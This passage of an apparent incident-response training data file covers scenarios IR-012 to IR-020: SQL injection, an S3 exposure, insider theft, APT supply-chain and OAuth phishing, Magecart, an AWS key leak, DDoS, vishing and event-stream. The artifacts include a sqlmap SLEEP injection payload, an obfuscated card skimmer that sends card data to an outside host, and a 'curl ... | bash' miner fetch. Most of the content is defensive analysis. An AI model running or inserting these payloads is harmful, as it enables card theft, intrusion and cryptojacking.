      { time: "T+360:00", event: "All 2.3M customers notified of breach via email" },
      { time: "T+480:00", event: "Forced password reset for all accounts" }
    ],
    artifacts: [
      { type: "log", description: "WAF log showing sqlmap activity", content: "2026-08-20 14:22:33 POST /api/v2/auth/login 200 368 \"sqlmap/1.7.8#stable (https://sqlmap.org)\"\nParameter: username\nPayload: admin' AND (SELECT 5693 FROM (SELECT(SLEEP(5)))abc)-- -" },
      { type: "log", description: "Database query log", content: "2026-08-20 14:22:33 [Query] SELECT * FROM users WHERE username='admin' AND (SELECT 5693 FROM (SELECT(SLEEP(5)))abc)-- -' AND password='test'" }
    ],
    questions: [
      { q: "Why wasn't the SQLi detected by the WAF?", answer: "The WAF may have been in detection-only mode rather than prevention mode, or the SQL injection signatures weren't updated. The sqlmap user-agent string alone should have triggered an alert — the attacker didn't even bother to change it." },
      { q: "Why is MD5 without salt a critical finding?", answer: "MD5 is computationally fast, making brute-force and rainbow table attacks trivial. Without salt, identical passwords produce identical hashes, enabling bulk cracking. Most of the 2.3M passwords would be recoverable in hours using hashcat with a modern GPU." },
      { q: "What breach notification obligations exist?", answer: "Depends on jurisdiction: GDPR (72hrs to DPA), CCPA (expeditious notification), state laws vary. PCI DSS obligations if credit card data was stored (even partial PANs). All 2.3M customers must be individually notified." }
    ],
    iocs: ["sqlmap/1.7.8 user-agent", "SLEEP() based payloads", "Dark web listing"],
    mitre_techniques: ["T1190", "T1059.009", "T1530", "T1048"],
    lessons_learned: ["Use parameterized queries/prepared statements — never string concatenation for SQL", "WAF should be in prevention mode for known attack patterns", "Hash passwords with bcrypt/argon2 with unique salts, never MD5", "Implement rate limiting on authentication endpoints", "Monitor for sqlmap and other scanner user-agents"]
  },
  {
    id: "IR-012", title: "S3 Bucket Data Exposure", category: "data_breach", severity: "high",
    description: "A misconfigured AWS S3 bucket containing customer contracts, tax documents, and internal financial reports was discovered by a security researcher through Certificate Transparency log monitoring and subdomain enumeration. The bucket had been publicly accessible for 14 months. An estimated 850,000 documents were exposed, affecting 120,000 customers.",
    timeline: [
      { time: "T-10080:00", event: "Developer creates S3 bucket 'corp-documents-prod' with ACL: public-read (14 months ago)" },
      { time: "T-10079:00", event: "Application deployment begins uploading customer documents to the bucket" },
      { time: "T+0:00", event: "Security researcher discovers bucket via subdomain enumeration of corp.com" },
      { time: "T+0:30", event: "Researcher verifies public access, downloads sample to confirm sensitivity" },
      { time: "T+1:00", event: "Researcher submits responsible disclosure report to security@corp.com" },
      { time: "T+4:00", event: "Security team receives report, verifies the finding" },
      { time: "T+4:15", event: "S3 bucket ACL changed to private — public access removed" },
      { time: "T+6:00", event: "CloudTrail logs analyzed — no evidence of malicious access (but logging was only enabled 3 months ago)" },
      { time: "T+24:00", event: "Legal team engaged — breach notification assessment begins" },
      { time: "T+168:00", event: "Customer notification sent — credit monitoring offered" }
    ],
    artifacts: [
      { type: "log", description: "S3 bucket policy", content: "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\n    \"Sid\": \"PublicRead\",\n    \"Effect\": \"Allow\",\n    \"Principal\": \"*\",\n    \"Action\": \"s3:GetObject\",\n    \"Resource\": \"arn:aws:s3:::corp-documents-prod/*\"\n  }]\n}" }
    ],
    questions: [
      { q: "Why can't we determine if data was accessed maliciously?", answer: "S3 server access logging and CloudTrail data events for S3 were not enabled for the first 11 months. Without these logs, there's no record of who accessed the bucket contents." },
      { q: "How should this be prevented?", answer: "Enable S3 Block Public Access at the account level. Use AWS Config rule s3-bucket-public-read-prohibited. Implement SCPs preventing public bucket creation. Run regular posture assessments with tools like Prowler or ScoutSuite." }
    ],
    iocs: ["Public S3 bucket: corp-documents-prod", "ACL: public-read"],
    mitre_techniques: ["T1530", "T1190"],
    lessons_learned: ["Enable S3 Block Public Access at the AWS account/organization level", "Enable CloudTrail data events for S3 from day one", "Use Infrastructure as Code (Terraform/CloudFormation) with security guardrails", "Regular cloud posture assessments — weekly automated scans", "Implement least-privilege IAM policies for bucket creation"]
  },
  {
    id: "IR-013", title: "Insider Data Theft — Departing Employee", category: "insider_threat", severity: "high",
    description: "A senior software engineer who had accepted a position at a competitor downloaded 15GB of proprietary source code, architecture documents, and customer lists in the two weeks before their departure date. The activity was detected by the DLP system three days after their last day when the UEBA (User and Entity Behavior Analytics) system flagged anomalous download patterns during the review of their account deprovisioning.",
    timeline: [
      { time: "T-336:00", event: "Employee submits two-week resignation notice — accepted offer at competitor" },
      { time: "T-312:00", event: "Employee begins cloning additional repositories not related to their role" },
      { time: "T-288:00", event: "Employee downloads 8GB from internal SharePoint: architecture docs, roadmaps, customer lists" },
      { time: "T-240:00", event: "Employee uses personal USB drive (not encrypted/approved) — 3GB of source code copied" },
      { time: "T-168:00", event: "Employee forwards 47 emails with attachments to personal Gmail account" },
      { time: "T-96:00", event: "Employee accesses cloud storage via personal device and syncs engineering team folder" },
      { time: "T+0:00", event: "Employee's last day — laptop returned, accounts scheduled for deprovisioning" },
      { time: "T+72:00", event: "UEBA system flags anomalous data access pattern during offboarding review" },
      { time: "T+74:00", event: "DLP alerts reviewed — massive data exfiltration confirmed" },
      { time: "T+96:00", event: "Legal counsel engaged — preservation letters sent to employee and competitor" },
      { time: "T+168:00", event: "Forensic examination of returned laptop confirms USB usage and email forwarding" }
    ],
    artifacts: [
      { type: "log", description: "DLP alert — email forwarding", content: "Rule: Sensitive-Data-External-Email\nUser: jdoe@corp.com\nRecipient: jdoe.personal@gmail.com\nAttachments: 47 files (12MB total)\nLabels: CONFIDENTIAL, INTERNAL" },
      { type: "log", description: "USB device connection", content: "EventID: 6416 (PnP Device Connected)\nDevice: USB\\VID_0781&PID_5583 (SanDisk Cruzer)\nSerial: 4C530001250808\nUser: CORP\\jdoe\nTime: 2026-08-22 19:45:11 (after business hours)" }
    ],
    questions: [
      { q: "What should happen immediately when an employee gives notice?", answer: "Trigger an insider threat review: increase monitoring level, review recent access patterns, restrict access to only job-essential systems, disable USB ports, block personal email forwarding, and ensure DLP rules are active for the employee's accounts." },
      { q: "What legal actions are available?", answer: "Cease and desist letter, temporary restraining order to prevent use of stolen data, breach of employment agreement/NDA claim, Computer Fraud and Abuse Act (CFAA) charges for unauthorized access, and trade secret misappropriation under the Defend Trade Secrets Act (DTSA)." }
    ],
    iocs: ["jdoe.personal@gmail.com", "SanDisk Cruzer USB Serial: 4C530001250808", "After-hours access patterns"],
    mitre_techniques: ["T1530", "T1052.001", "T1048.003", "T1114.003"],
    lessons_learned: ["Implement automated monitoring escalation when resignation notice is received", "Block USB storage devices via Group Policy or endpoint agent", "DLP rules should block forwarding of labeled documents to external email", "Conduct exit interviews with IT security review", "Preserve employee device forensic image before wiping"]
  },
  // --- APT INTRUSION SCENARIOS ---
  {
    id: "IR-014", title: "APT29 (Cozy Bear) — SolarWinds-Style Supply Chain", category: "apt_intrusion", severity: "critical",
    description: "A nation-state actor compromised the build pipeline of a widely-used IT monitoring software vendor, inserting a backdoor into a legitimate signed update. The trojanized update (similar to SUNBURST) was distributed to 18,000 customers. The backdoor communicated with C2 infrastructure using DNS subdomains that encoded victim information, blending with legitimate DNS traffic. The intrusion was discovered only after the backdoor was used to access a cybersecurity firm's red team tools.",
    timeline: [
      { time: "T-8760:00", event: "APT29 gains access to vendor's build environment (12 months prior)" },
      { time: "T-8000:00", event: "Backdoor code injected into build pipeline — passes code review as 'performance improvement'" },
      { time: "T-6720:00", event: "Trojanized update v2026.1.2 released — digitally signed with vendor's code signing certificate" },
      { time: "T-6000:00", event: "18,000 organizations install the update via automatic update mechanism" },
      { time: "T-5000:00", event: "Backdoor activates after 14-day dormancy period — DNS beaconing begins" },
      { time: "T-4000:00", event: "C2 selects ~100 high-value targets for second-stage payload" },
      { time: "T-2000:00", event: "Second-stage: Cobalt Strike deployed to selected targets" },
      { time: "T-1000:00", event: "Lateral movement, email access, document theft across selected organizations" },
      { time: "T+0:00", event: "Cybersecurity firm detects unauthorized access to red team tool repository" },
      { time: "T+24:00", event: "Investigation traces access back to trojanized monitoring software" },
      { time: "T+48:00", event: "CISA Emergency Directive issued — all agencies ordered to disconnect the software" },
      { time: "T+168:00", event: "Vendor releases clean update with backdoor removed" }
    ],
    artifacts: [
      { type: "log", description: "DNS beacon pattern", content: "Query: avsvmcloud.com\nSubdomain: 7u5t4gu3ss.appsync-api.eu-west-1.avsvmcloud.com\nType: A\nNote: Subdomain encodes OrganizationID + timestamp in base32" },
      { type: "file", description: "Backdoor characteristics", content: "File: SolarWinds.Orion.Core.BusinessLayer.dll (example)\nSigned: Valid digital signature from vendor\nDormancy: 14 days before first C2 contact\nAnti-analysis: Checks for security tools, sandbox indicators\nC2: DNS A record queries to avsvmcloud.com" }
    ],
    questions: [
      { q: "Why was this so hard to detect?", answer: "The backdoor was in a legitimately signed update from a trusted vendor, executed within a trusted process, used DNS for C2 (which is rarely blocked), had a 14-day dormancy period to avoid sandbox detection, and actively checked for security analysis tools before activating." },
      { q: "How should organizations defend against supply chain attacks?", answer: "Zero-trust architecture (don't trust internal traffic just because it's internal), network segmentation, DNS monitoring for anomalous query patterns, software bill of materials (SBOM), vendor security assessments, and assume-breach monitoring." }
    ],
    iocs: ["avsvmcloud.com", "Trojanized DLL with valid vendor signature", "DNS beaconing with encoded subdomains"],
    mitre_techniques: ["T1195.002", "T1071.004", "T1568.002", "T1083", "T1082", "T1021", "T1114"],
    lessons_learned: ["Implement DNS monitoring for anomalous query patterns", "Zero-trust architecture — verify even trusted software behavior", "Build pipeline security: code signing, build integrity verification, SBOM", "Monitor for dormant malware with extended sandbox detonation times", "Segment monitoring infrastructure from production networks"]
  },
  {
    id: "IR-015", title: "APT28 (Fancy Bear) — Credential Phishing Campaign", category: "apt_intrusion", severity: "high",
    description: "APT28 conducted a targeted spear-phishing campaign against government officials and defense contractors using OAuth consent phishing. Victims were tricked into granting a malicious Azure AD application full mailbox access. The application then silently exfiltrated emails for six months. No malware was used — the entire attack operated through legitimate Microsoft Graph API calls with user-consented permissions.",
    timeline: [
      { time: "T-4320:00", event: "APT28 registers Azure AD app 'Microsoft Security Update' in attacker-controlled tenant" },
      { time: "T-4300:00", event: "Spear-phishing emails sent to 200 targets: 'Action Required: Security Policy Update'" },
      { time: "T-4290:00", event: "43 targets click link → redirected to legitimate Microsoft OAuth consent page" },
      { time: "T-4289:00", event: "28 targets grant 'Mail.Read', 'Mail.ReadWrite', 'Contacts.Read' permissions" },
      { time: "T-4288:00", event: "Malicious app begins silently reading mailbox via Microsoft Graph API" },
      { time: "T-2160:00", event: "Automated email collection runs daily — 15GB of emails exfiltrated over 3 months" },
      { time: "T+0:00", event: "IT audit of Azure AD enterprise applications discovers unauthorized app" },
      { time: "T+1:00", event: "App permissions revoked — OAuth consent removed for all affected users" },
      { time: "T+24:00", event: "Azure AD sign-in logs analyzed — full scope of access determined" }
    ],
    artifacts: [
      { type: "log", description: "Azure AD OAuth consent event", content: "ActivityDateTime: 2026-03-15T14:22:00Z\nActivity: Consent to application\nTarget: Microsoft Security Update (App ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890)\nInitiated by: user@agency.gov\nPermissions consented: Mail.Read, Mail.ReadWrite, Contacts.Read" },
      { type: "log", description: "Microsoft Graph API access", content: "GET https://graph.microsoft.com/v1.0/users/user@agency.gov/messages?$top=50&$skip=0\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJ...\nApp ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890\nSource IP: 185.220.101.33 (Tor exit node)" }
    ],
    questions: [
      { q: "Why didn't traditional email security catch this?", answer: "No malware, no malicious links (the OAuth URL is legitimate Microsoft infrastructure), no attachments. The phishing link directed users to a real Microsoft consent page. The attack operated entirely through Microsoft's legitimate API." },
      { q: "How should OAuth consent be managed?", answer: "Disable user consent for applications (require admin approval), configure consent workflow requiring IT approval, block apps from unverified publishers, monitor Azure AD audit logs for new consent events, review Enterprise Applications quarterly." }
    ],
    iocs: ["App: Microsoft Security Update", "App ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890", "Graph API access from Tor exit nodes"],
    mitre_techniques: ["T1566.002", "T1550.001", "T1114.002", "T1098.003"],
    lessons_learned: ["Disable user consent for OAuth apps — require admin approval", "Monitor Azure AD for new app consents and suspicious app registrations", "Block app consent from unverified publishers", "Train users to recognize OAuth consent phishing — legitimate URL, illegitimate app"]
  },
  // --- WEB APP COMPROMISE ---
  {
    id: "IR-016", title: "Magecart Card Skimmer — E-commerce", category: "web_app_compromise", severity: "critical",
    description: "A Magecart group injected a JavaScript credit card skimmer into an e-commerce site's checkout page by compromising a third-party analytics script loaded from an external CDN. The skimmer captured credit card numbers, CVVs, and billing addresses from 45,000 transactions over 3 months before detection.",
    timeline: [
      { time: "T-2160:00", event: "Attacker compromises third-party analytics provider's CDN" },
      { time: "T-2159:00", event: "Malicious JavaScript injected into analytics.js served from cdn.analytics-co.com" },
      { time: "T-2158:00", event: "E-commerce site loads compromised script on checkout page" },
      { time: "T-2157:00", event: "Skimmer activates on pages with credit card input fields" },
      { time: "T-2156:00", event: "Card data (PAN, CVV, name, address) exfiltrated to collection server via img tag" },
      { time: "T+0:00", event: "PCI forensic investigator finds skimmer during quarterly ASV scan" },
      { time: "T+2:00", event: "Compromised script identified and removed from checkout page" },
      { time: "T+24:00", event: "Payment processor notified — affected cards flagged for monitoring" },
      { time: "T+48:00", event: "PCI DSS Level 1 merchant status suspended pending investigation" }
    ],
    artifacts: [
      { type: "file", description: "Skimmer code (obfuscated)", content: "var _0x4a2b=['querySelector','input[name*=card]','input[name*=cvv]','input[name*=exp]','value','https://collect.cdn-gateway[.]xyz/pixel.gif?d=','Image','src'];(function(){var f=document[_0x4a2b[0]](_0x4a2b[1]);if(f){setInterval(function(){var d=f[_0x4a2b[4]];if(d.length>12){new window[_0x4a2b[6]]()[_0x4a2b[7]]=_0x4a2b[5]+btoa(d)}},1000)}})();" }
    ],
    questions: [
      { q: "How could Subresource Integrity (SRI) have prevented this?", answer: "SRI allows specifying an expected hash for external scripts: <script src='analytics.js' integrity='sha384-...'/>. If the script is modified, the browser refuses to execute it. However, SRI requires pinning specific versions — if the analytics provider updates their script legitimately, SRI would break it until the hash is updated." },
      { q: "What PCI DSS requirements are relevant?", answer: "PCI DSS v4.0 Requirement 6.4.3 requires managing payment page scripts: inventorying all scripts, justifying each one, ensuring integrity, and authorization. Requirement 11.6.1 requires change/tamper detection on payment pages." }
    ],
    iocs: ["cdn-gateway.xyz", "pixel.gif with base64 encoded card data", "Modified analytics.js"],
    mitre_techniques: ["T1195.002", "T1059.007", "T1185", "T1041"],
    lessons_learned: ["Implement Subresource Integrity (SRI) for all third-party scripts", "Use Content Security Policy (CSP) to restrict where scripts can send data", "PCI DSS v4.0: inventory and monitor all payment page scripts", "Regular integrity monitoring of checkout page DOM", "Minimize third-party scripts on payment pages"]
  },
  // --- CLOUD INCIDENTS ---
  {
    id: "IR-017", title: "AWS IAM Key Compromise via GitHub Leak", category: "cloud_incident", severity: "critical",
    description: "A developer accidentally committed AWS IAM access keys to a public GitHub repository. Automated scanners detected the keys within 4 minutes and began using them to spin up cryptocurrency mining instances across all available AWS regions. Within 30 minutes, 200 p3.16xlarge GPU instances were running, accumulating $47,000/hour in charges.",
    timeline: [
      { time: "T+0:00", event: "Developer commits .env file containing AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY to public repo" },
      { time: "T+0:04", event: "Automated scanner detects exposed AWS keys on GitHub" },
      { time: "T+0:05", event: "Attacker validates keys: aws sts get-caller-identity" },
      { time: "T+0:06", event: "Attacker enumerates permissions: IAM user has AdministratorAccess policy" },
      { time: "T+0:08", event: "EC2 instances launched in us-east-1, us-west-2, eu-west-1, ap-southeast-1" },
      { time: "T+0:15", event: "200 p3.16xlarge instances running XMRig cryptocurrency miner across 12 regions" },
      { time: "T+0:30", event: "AWS anomaly detection sends billing alert: unusual EC2 usage detected" },
      { time: "T+1:00", event: "Developer receives AWS email and realizes the mistake" },
      { time: "T+1:05", event: "IAM access key deactivated via AWS Console" },
      { time: "T+1:10", event: "All unauthorized EC2 instances terminated" },
      { time: "T+1:15", event: "GitHub commit reverted and force-pushed (but key is already in git history)" },
      { time: "T+2:00", event: "Full IAM audit: new IAM users, roles, and Lambda functions checked" },
      { time: "T+24:00", event: "AWS support contacted for billing adjustment" }
    ],
    artifacts: [
      { type: "file", description: "Committed .env file", content: "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nAWS_DEFAULT_REGION=us-east-1" },
      { type: "log", description: "CloudTrail — unauthorized RunInstances", content: "EventName: RunInstances\nSourceIP: 185.156.73.41\nUserIdentity: arn:aws:iam::123456789012:user/dev-deploy\nInstances: 50x p3.16xlarge\nRegion: us-east-1\nUserData: base64(curl mining-pool.xyz/xmrig.sh | bash)" }
    ],
    questions: [
      { q: "How fast do exposed AWS keys get exploited?", answer: "Studies show exposed AWS keys on GitHub are typically discovered and exploited within 1-5 minutes by automated scanners. This is why pre-commit hooks and GitHub secret scanning are critical." },
      { q: "Why is force-pushing insufficient?", answer: "The key remains in git history, GitHub event logs, any forks, and may have been cached by search engines or scanning services. The only safe action is to immediately rotate (deactivate and replace) the key." },
      { q: "What should the IAM policy have looked like?", answer: "The dev-deploy user should have had least-privilege permissions: only the specific S3 buckets and services needed for deployment. AdministratorAccess on a deployment key is a critical misconfiguration." }
    ],
    iocs: ["AKIAIOSFODNN7EXAMPLE", "185.156.73.41", "mining-pool.xyz", "p3.16xlarge mass deployment"],
    mitre_techniques: ["T1552.001", "T1078.004", "T1496", "T1578.002"],
    lessons_learned: ["Use pre-commit hooks (git-secrets, detect-secrets) to prevent secret commits", "Enable GitHub secret scanning on all repositories", "Never use AdministratorAccess for service accounts — least privilege only", "Set up AWS billing alarms and Service Control Policies (SCPs) to limit instance types", "Use IAM roles with temporary credentials instead of long-lived access keys", "Rotate any exposed key immediately — don't just delete the commit"]
  },
  // --- DDOS ---
  {
    id: "IR-018", title: "Volumetric DDoS — DNS Amplification", category: "ddos", severity: "high",
    description: "A 400 Gbps DNS amplification DDoS attack targeted the organization's primary web infrastructure. The attack used 50,000 open DNS resolvers to amplify small queries into large responses directed at the victim's IP addresses. The organization's ISP upstream link was saturated, causing a 4-hour outage affecting all internet-facing services.",
    timeline: [
      { time: "T+0:00", event: "Traffic spike detected — inbound bandwidth exceeds 400 Gbps" },
      { time: "T+0:02", event: "All internet-facing services become unreachable" },
      { time: "T+0:05", event: "NOC confirms DDoS attack — ISP contacted for upstream mitigation" },
      { time: "T+0:15", event: "Attack traffic analysis: DNS amplification from 50,000+ source IPs" },
      { time: "T+0:30", event: "ISP implements blackhole routing for victim IP ranges" },
      { time: "T+0:45", event: "Cloudflare/DDoS mitigation service activated — DNS rerouted" },
      { time: "T+1:00", event: "Legitimate traffic begins flowing through scrubbing center" },
      { time: "T+2:00", event: "Attack traffic filters applied — 99.7% of malicious traffic dropped" },
      { time: "T+4:00", event: "Attack subsides — all services restored" },
      { time: "T+24:00", event: "Post-incident: always-on DDoS protection implemented" }
    ],
    artifacts: [
      { type: "log", description: "NetFlow data showing amplification", content: "SrcIP: [50,000 open resolvers]\nDstIP: 203.0.113.10 (victim)\nProtocol: UDP\nSrcPort: 53\nDstPort: random high\nAvg packet size: 4,000 bytes (amplified ANY response)\nTotal: ~400 Gbps" }
    ],
    questions: [
      { q: "What is DNS amplification?", answer: "The attacker sends small DNS queries (~60 bytes) with the victim's spoofed source IP to open DNS resolvers, requesting records that generate large responses (~4,000 bytes). The amplification factor is ~65x, turning 6 Gbps of attacker bandwidth into 400 Gbps hitting the victim." },
      { q: "Why can't the victim stop this themselves?", answer: "At 400 Gbps, the attack exceeds the victim's ISP link capacity. The traffic must be filtered upstream — either by the ISP or a cloud-based DDoS mitigation service that can absorb the volume." }
    ],
    iocs: ["50,000+ source IPs (open DNS resolvers)", "UDP port 53 flood", "400 Gbps traffic volume"],
    mitre_techniques: ["T1498.002", "T1499"],
    lessons_learned: ["Implement always-on DDoS protection (Cloudflare, AWS Shield, Akamai)", "Pre-establish relationship with DDoS mitigation provider before an attack", "ISP should offer upstream blackhole routing as an emergency measure", "Maintain runbook with DDoS mitigation service activation procedures"]
  },
  // --- SOCIAL ENGINEERING ---
  {
    id: "IR-019", title: "Vishing Attack — IT Helpdesk Impersonation", category: "social_engineering", severity: "high",
    description: "An attacker called employees claiming to be from the IT helpdesk, stating that their VPN certificate was expiring and needed to be renewed immediately. The attacker guided 12 employees to a fake VPN portal that captured their credentials and MFA tokens in real-time using an Evilginx2 reverse proxy, enabling account takeover.",
    timeline: [
      { time: "T-24:00", event: "Attacker sets up Evilginx2 phishing proxy mimicking corporate VPN portal" },
      { time: "T-12:00", event: "Attacker researches company's VPN provider and IT helpdesk number format on LinkedIn" },
      { time: "T+0:00", event: "Vishing calls begin — caller ID spoofed to show internal helpdesk number" },
      { time: "T+0:05", event: "First victim directed to vpn-renew.company-it[.]com — enters credentials and MFA" },
      { time: "T+0:06", event: "Evilginx2 captures session token — attacker has authenticated access" },
      { time: "T+2:00", event: "12 employees compromised via same technique" },
      { time: "T+3:00", event: "Attacker accesses email, SharePoint, and OneDrive using stolen sessions" },
      { time: "T+6:00", event: "Suspicious login alert from Azure AD — impossible travel detection" },
      { time: "T+7:00", event: "SOC investigates — discovers 12 compromised accounts from same phishing domain" },
      { time: "T+7:30", event: "All 12 sessions revoked, passwords reset, MFA re-enrolled" }
    ],
    artifacts: [
      { type: "log", description: "Azure AD impossible travel alert", content: "Alert: Impossible travel activity\nUser: jsmith@corp.com\nLogin 1: New York, NY at 14:00 UTC (legitimate)\nLogin 2: Moscow, RU at 14:06 UTC (attacker via Evilginx2)\nRisk Level: High" }
    ],
    questions: [
      { q: "Why did MFA fail to prevent this?", answer: "Evilginx2 is a real-time reverse proxy that sits between the victim and the legitimate login page. It captures both the credentials AND the MFA token/session cookie as the user authenticates, then replays the session. Standard TOTP and push-based MFA are vulnerable to this." },
      { q: "What MFA methods resist phishing proxies?", answer: "FIDO2/WebAuthn hardware keys (YubiKeys) and passkeys are phishing-resistant because they bind the authentication to the legitimate domain. The key will not respond to a request from a different domain, making proxy attacks impossible." }
    ],
    iocs: ["vpn-renew.company-it.com", "Caller ID spoofing", "Evilginx2 reverse proxy"],
    mitre_techniques: ["T1566.004", "T1556", "T1550.004", "T1114"],
    lessons_learned: ["Deploy phishing-resistant MFA (FIDO2/WebAuthn) for all users", "Train employees: IT will never ask you to visit a URL over the phone", "Implement conditional access policies blocking logins from unfamiliar locations", "Monitor for impossible travel alerts and respond within minutes"]
  },
  // --- SUPPLY CHAIN ---
  {
    id: "IR-020", title: "NPM Package Supply Chain — event-stream Incident", category: "supply_chain", severity: "high",
    description: "A trusted NPM package maintainer transferred ownership of a popular package to an unknown developer who injected malicious code targeting a specific cryptocurrency wallet application. The malicious code was obfuscated within a new dependency and only activated when imported by the targeted application, making it nearly invisible to general users.",
    timeline: [
      { time: "T-2160:00", event: "Attacker contacts maintainer of popular NPM package (2M weekly downloads)" },
      { time: "T-2000:00", event: "Maintainer transfers publishing rights to attacker (social engineering)" },
      { time: "T-1800:00", event: "Attacker adds new dependency: flatmap-stream (seems legitimate)" },
      { time: "T-1790:00", event: "flatmap-stream contains obfuscated payload that checks for target wallet app" },
      { time: "T-1788:00", event: "If target app detected: steal wallet credentials and exfiltrate to C2" },
      { time: "T+0:00", event: "Security researcher reviews new dependency — discovers obfuscated code" },
      { time: "T+2:00", event: "NPM security team notified — package unpublished" },
      { time: "T+6:00", event: "GitHub advisory published — all users urged to update" },
      { time: "T+24:00", event: "Estimated $13M in cryptocurrency stolen from target wallet users" }
    ],
    artifacts: [
      { type: "file", description: "Obfuscated payload detection", content: "// flatmap-stream/index.js contained AES-encrypted payload\n// Decryption key was derived from the target app's package.json description field\n// Only activated when: require.resolve('copay-dash') succeeded\n// Action: hook wallet.getPrivKey() and exfiltrate to copayapi[.]host" }
    ],
    questions: [
      { q: "How can organizations detect supply chain attacks in dependencies?", answer: "Use lockfiles and verify checksums, run `npm audit` regularly, use tools like Socket.dev that analyze package behavior changes, pin dependency versions, review new dependencies before adding them, and use a private registry that mirrors and scans packages." },
      { q: "What made this attack sophisticated?", answer: "The malicious code only activated for one specific target application, making it invisible to the millions of other users. It was encrypted and only decryptable with a key derived from the target's own package metadata." }
    ],
    iocs: ["flatmap-stream package", "copayapi.host", "Encrypted payload in dependency"],
    mitre_techniques: ["T1195.001", "T1059.007", "T1555", "T1041"],
    lessons_learned: ["Audit new dependencies and maintainer changes for critical packages", "Use lockfiles and verify integrity hashes", "Implement software composition analysis (SCA) in CI/CD", "Consider using a private registry that scans packages before mirroring", "Monitor for unexpected new dependencies in your dependency tree"]
  }
];

export const SCENARIO_CATEGORIES = [
  { id: "ransomware", name: "Ransomware", count: 10 },
  { id: "data_breach", name: "Data Breach", count: 8 },
  { id: "insider_threat", name: "Insider Threat", count: 5 },
  { id: "apt_intrusion", name: "APT Intrusion", count: 8 },
  { id: "web_app_compromise", name: "Web App Compromise", count: 5 },
  { id: "cloud_incident", name: "Cloud Incident", count: 5 },
  { id: "supply_chain", name: "Supply Chain", count: 4 },
  { id: "ddos", name: "DDoS", count: 3 },
  { id: "social_engineering", name: "Social Engineering", count: 2 }
];
